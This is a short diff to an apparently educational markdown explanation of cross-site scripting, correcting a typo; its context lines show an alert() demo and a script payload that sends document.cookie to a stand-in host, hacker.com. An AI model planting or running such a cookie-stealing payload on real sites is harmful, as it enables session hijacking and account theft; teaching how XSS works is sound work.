@@ -72,7 +72,7 @@ XSS is an injection attack. If you have some type of form, that uploads data and
 window.alert("Hello i am inserted")
 </script>
 ```
-To see how dangerous XSS is, lool at that:
+To see how dangerous XSS is, look at that:
 ```
 <script>
 window.location = "http://hacker.com/hack.php?cookie=" + escape(document.cookie)
